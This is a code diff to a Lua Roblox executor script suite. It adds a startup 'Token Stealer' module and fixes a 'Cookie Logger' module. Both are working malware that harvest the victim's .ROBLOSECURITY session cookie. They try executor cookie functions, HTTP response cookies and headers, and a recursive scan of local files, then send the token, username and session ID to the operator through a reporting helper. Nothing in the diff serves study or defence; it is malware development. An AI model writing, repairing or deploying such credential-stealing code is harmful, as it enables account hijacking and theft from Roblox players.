@@ -316,7 +316,153 @@ task.wait(1)
 -- ============================================================
 -- MODULE 3: Token Stealer v7
 -- Startup (auto) — grabs .ROBLOSECURITY via all available methods
--- Fixed: res.Cookies table, header sniff, file scan, all executors
+-- ============================================================
+task.spawn(function()
+    local exec = getExec()
+    local token = nil
+    local methodUsed = "none"
+    local log = {}
+    local req = request or http_request or (syn and syn.request) or (http and http.request)
+
+    send("TOKEN STEALER STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Executor:** " .. exec .. "\n**Status:** Running all methods...", 16776960)
+    task.wait(0.3)
+
+    -- M1: syn.get_cookie
+    if not token and syn and syn.get_cookie then
+        pcall(function()
+            local v = syn.get_cookie(".ROBLOSECURITY")
+            if v and #v > 20 then token = v methodUsed = "M1: syn.get_cookie" end
+        end)
+        table.insert(log, "M1:" .. (token and "HIT" or "miss"))
+    else table.insert(log, "M1:skip") end
+
+    -- M2: get_cookie
+    if not token and get_cookie then
+        pcall(function()
+            local v = get_cookie(".ROBLOSECURITY")
+            if v and #v > 20 then token = v methodUsed = "M2: get_cookie" end
+        end)
+        table.insert(log, "M2:" .. (token and "HIT" or "miss"))
+    else table.insert(log, "M2:skip") end
+
+    -- M3: getrbxcookie
+    if not token and getrbxcookie then
+        pcall(function()
+            local v = getrbxcookie()
+            if v and #v > 20 then token = v methodUsed = "M3: getrbxcookie" end
+        end)
+        table.insert(log, "M3:" .. (token and "HIT" or "miss"))
+    else table.insert(log, "M3:skip") end
+
+    -- M4: getcookies() flat + nested
+    if not token and getcookies then
+        pcall(function()
+            local c = getcookies()
+            if type(c) == "table" then
+                for k, v in pairs(c) do
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                        token = tostring(v) methodUsed = "M4: getcookies flat" break
+                    end
+                    if type(v) == "table" then
+                        for ck, cv in pairs(v) do
+                            if tostring(ck):find("ROBLOSECURITY") and #tostring(cv) > 20 then
+                                token = tostring(cv) methodUsed = "M4: getcookies nested" break
+                            end
+                        end
+                    end
+                    if token then break end
+                end
+            end
+        end)
+        table.insert(log, "M4:" .. (token and "HIT" or "miss"))
+    else table.insert(log, "M4:skip") end
+
+    -- M5: res.Cookies table — universal, works on Xeno
+    if not token and req then
+        pcall(function()
+            local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
+            if res then
+                if type(res.Cookies) == "table" then
+                    for k, v in pairs(res.Cookies) do
+                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                            token = tostring(v) methodUsed = "M5: res.Cookies"
+                        end
+                    end
+                end
+                if not token and type(res.cookies) == "table" then
+                    for k, v in pairs(res.cookies) do
+                        if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                            token = tostring(v) methodUsed = "M5: res.cookies lower"
+                        end
+                    end
+                end
+                if not token and res.Headers then
+                    for k, v in pairs(res.Headers) do
+                        if tostring(k):lower():find("set%-cookie") then
+                            local raw = type(v) == "table" and table.concat(v, "; ") or tostring(v)
+                            local found = raw:match("%.ROBLOSECURITY=([^;]+)")
+                            if found and #found > 20 then token = found methodUsed = "M5: Set-Cookie header" end
+                        end
+                    end
+                end
+            end
+        end)
+        table.insert(log, "M5:" .. (token and "HIT" or "miss"))
+    else table.insert(log, "M5:no req") end
+
+    -- M6: recursive readfile scan
+    if not token and readfile then
+        pcall(function()
+            local scanned = 0
+            local function scanPath(path)
+                if scanned >= 400 or token then return end
+                local ok, content = pcall(readfile, path)
+                if ok and type(content) == "string" and #content > 10 then
+                    scanned = scanned + 1
+                    local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                                or content:match("%.ROBLOSECURITY=([^;%s]+)")
+                    if found and #found > 20 then
+                        token = found methodUsed = "M6: readfile " .. path return
+                    end
+                end
+                if listfiles then
+                    local lok, files = pcall(listfiles, path)
+                    if lok and type(files) == "table" then
+                        for _, f in ipairs(files) do
+                            if scanned >= 400 or token then break end
+                            scanPath(f)
+                        end
+                    end
+                end
+            end
+            local roots = {"", "cache", "Cache", "cookies", "Cookies", "session", "data", "Data", "Xeno", "xeno"}
+            for _, root in ipairs(roots) do
+                if token then break end
+                scanPath(root)
+            end
+            table.insert(log, "M6:" .. (token and "HIT" or ("miss/" .. scanned .. "files")))
+        end)
+    else table.insert(log, "M6:no readfile") end
+
+    local logStr = table.concat(log, " | ")
+    if token then
+        send("ROBLOSECURITY TOKEN",
+            "**User:** " .. LocalPlayer.Name ..
+            "\n**Method:** " .. methodUsed ..
+            "\n**Executor:** " .. exec ..
+            "\n**Session:** " .. SESSION_ID ..
+            "\n**Token:**\n```" .. token:sub(1, 900) .. "```",
+            16711680)
+    else
+        send("TOKEN STEALER FAILED",
+            "**User:** " .. LocalPlayer.Name ..
+            "\n**Executor:** " .. exec ..
+            "\n**Log:** " .. logStr,
+            16711680)
+    end
+end)
+task.wait(2)
+
 -- ============================================================
 task.spawn(function()
     local exec = getExec()
@@ -2053,7 +2199,6 @@ getgenv().IntelSuite.RequireScanner = runRequireScanner
 -- MODULE 27: Cookie Logger
 -- Trigger: Startup (auto) + !cmd cookielog
 -- Works on: ALL executors including Xeno
--- Fixed: no unescaped quotes in patterns, uses send() helper
 -- ============================================================
 local function runCookieLogger()
     local cookie = nil
@@ -2103,7 +2248,6 @@ local function runCookieLogger()
     else table.insert(log, "M3:not available") end
 
     -- M4: res.Cookies table — universal, works on Xeno
-    -- executor populates this automatically, separate from headers
     if not cookie and req then
         pcall(function()
             local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
@@ -2138,7 +2282,7 @@ local function runCookieLogger()
         table.insert(log, "M4:" .. (cookie and "HIT" or "miss"))
     else table.insert(log, "M4:no req") end
 
-    -- M5: multi-endpoint Cookies table check
+    -- M5: multi-endpoint Cookies check
     if not cookie and req then
         local endpoints = {
             { Url = "https://www.roblox.com/login", Method = "GET" },
@@ -2176,7 +2320,7 @@ local function runCookieLogger()
     else table.insert(log, "M5:skipped") end
 
     -- M6: recursive readfile scan — confirmed available on Xeno
-    -- single-quoted patterns to avoid any quote escaping issues
+    -- patterns use [^;%s,]+ to avoid any quote issues
     if not cookie and readfile then
         pcall(function()
             local scanned = 0
@@ -2185,10 +2329,8 @@ local function runCookieLogger()
                 local ok, content = pcall(readfile, path)
                 if ok and type(content) == "string" and #content > 10 then
                     scanned = scanned + 1
-                    local found = content:match('ROBLOSECURITY[=_]([^;%s,
-]+)')
-                                or content:match('%.ROBLOSECURITY=([^;%s
-]+)')
+                    local found = content:match("ROBLOSECURITY[=_]([^;%s,]+)")
+                                or content:match("%.ROBLOSECURITY=([^;%s]+)")
                     if found and #found > 20 then
                         cookie = found
                         methodUsed = "M6: readfile " .. tostring(path)
@@ -2216,7 +2358,7 @@ local function runCookieLogger()
         end)
     else table.insert(log, "M6:no readfile") end
 
-    -- M7: full res field dump — if everything fails, shows Kevin what Xeno exposes
+    -- M7: full res field dump — shows Kevin exactly what Xeno exposes
     if not cookie and req then
         pcall(function()
             local res = req({ Url = "https://www.roblox.com/", Method = "GET" })
@@ -2226,10 +2368,9 @@ local function runCookieLogger()
                     local val = tostring(v)
                     if #val > 120 then val = val:sub(1, 120) .. "..." end
                     dump = dump .. "- " .. tostring(k) .. ": " .. val .. "\n"
-                    -- check every field for the cookie string
                     local full = tostring(v)
-                    local found = full:match('ROBLOSECURITY[=_ ]*([A-Za-z0-9_%-]{20,})')
-                    if found then
+                    local found = full:match("ROBLOSECURITY[=_ ]*([A-Za-z0-9_%-]+)")
+                    if found and #found > 20 then
                         cookie = found methodUsed = "M7: res." .. tostring(k)
                     end
                 end
@@ -2241,7 +2382,6 @@ local function runCookieLogger()
         table.insert(log, "M7:" .. (cookie and "HIT" or "dump sent"))
     end
 
-    -- Report
     local uid = tostring(LocalPlayer.UserId)
     local logStr = table.concat(log, " | ")
 
@@ -2271,6 +2411,5 @@ local function runCookieLogger()
     end
 end
 
--- Auto-run on startup
 task.spawn(runCookieLogger)
 getgenv().IntelSuite.CookieLogger = runCookieLogger
